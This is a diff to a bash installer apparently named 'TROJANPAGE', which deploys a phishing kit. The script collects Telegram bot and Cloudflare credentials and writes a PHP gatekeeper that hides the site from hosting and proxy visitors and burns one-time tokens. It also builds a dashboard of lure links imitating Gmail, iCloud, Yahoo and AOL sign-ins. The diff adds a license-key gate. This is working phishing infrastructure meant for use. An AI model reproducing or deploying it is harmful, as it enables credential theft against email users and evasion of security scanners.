@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJANPAGE - VALIDATED GHOST EDITION (V14.8.2)
+# 🏛️ TROJANPAGE - SECURE VALIDATED GHOST (V14.8.3)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -24,31 +24,37 @@ mkdir -p /root/db/
 touch /root/db/used_tokens.txt
 chmod 777 /root/db/used_tokens.txt
 
-# --- 2. SETTINGS & VALIDATION ---
+# --- 2. LICENSE & SECURITY GATE ---
+MASTER_KEY="TROJAN-PRO-2026"
 show_header
+echo -e "${YELLOW}»» SECURITY TERMINAL LOCKED${NC}"
+read -p "ENTER SYSTEM KEY: " USER_INPUT
+[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}ACCESS DENIED.${NC}"; exit 1; }
 
-# --- TOKEN VALIDATION LOOP ---
+# --- 3. TELEGRAM VALIDATION LOOP ---
+echo -e "${GREEN}[success] License Verified.${NC}"
 while true; do
     read -p "Enter Telegram Bot Token: " TG_TOKEN
     echo -e "${CYAN}[...] Validating Token...${NC}"
     CHECK_TOKEN=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
     if [[ $CHECK_TOKEN == *"\"ok\":true"* ]]; then
         BOT_NAME=$(echo $CHECK_TOKEN | grep -oP '(?<="first_name":")[^"]*')
-        echo -e "${GREEN}[success] Connected to: $BOT_NAME${NC}"
+        echo -e "${GREEN}[success] Bot Connected: $BOT_NAME${NC}"
         break
     else
         echo -e "${RED}[error] Invalid Telegram Token. Please try again.${NC}"
     fi
 done
 
+# --- 4. CLOUDFLARE & DOMAIN SETTINGS ---
 read -p "Enter Telegram Chat ID: " TG_ID
 read -p "Enter Cloudflare API Token: " CF_TOKEN
 read -p "Enter Base Domain: " USER_DOMAIN
 USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
-read -p "Enter Custom Path Slug (e.g., verify): " USER_SLUG
+read -p "Enter Custom Path Slug: /" USER_SLUG
 CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')
 
-# --- 3. THE SMART GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
+# --- 5. THE GATEKEEPER (ALL DOMAINS + TG ALERTS) ---
 mkdir -p /var/www/adobe_gui/s
 cat << EOF > /var/www/adobe_gui/s/index.php
 <?php
@@ -75,7 +81,7 @@ if (\$meta && (\$meta->hosting == true || \$meta->proxy == true)) {
     exit();
 }
 
-// C. ONE-TIME TOKEN CHECK (THE BURNER)
+// C. ONE-TIME TOKEN CHECK
 \$used_tokens = file("/root/db/used_tokens.txt", FILE_IGNORE_NEW_LINES);
 if (in_array(\$token, \$used_tokens)) {
     header("Location: https://www.microsoft.com"); 
@@ -106,7 +112,7 @@ exit();
 ?>
 EOF
 
-# --- 4. THE COMPLETE DASHBOARD ---
+# --- 6. THE COMPLETE DASHBOARD ---
 cat << 'EOF' > /root/run.sh
 #!/bin/bash
 RED='\033[0;31m'
@@ -133,7 +139,6 @@ SLUG=$(echo "$USER_SLUG")
 MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
 TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)
 
-# Tracker Logic
 if [ -f /root/links_batch.txt ]; then
     TOTAL=$(wc -l < /root/links_batch.txt)
     BURNED=$(grep -Ff <(grep -oP 't=\K.*' /root/links_batch.txt) /root/db/used_tokens.txt | wc -l)
@@ -152,5 +157,3 @@ echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=
 echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
 echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
 echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
-echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${BLUE}║${NC}  ${YELLOW}BATCH TRACKER:${NC} TOTAL: $TOTAL
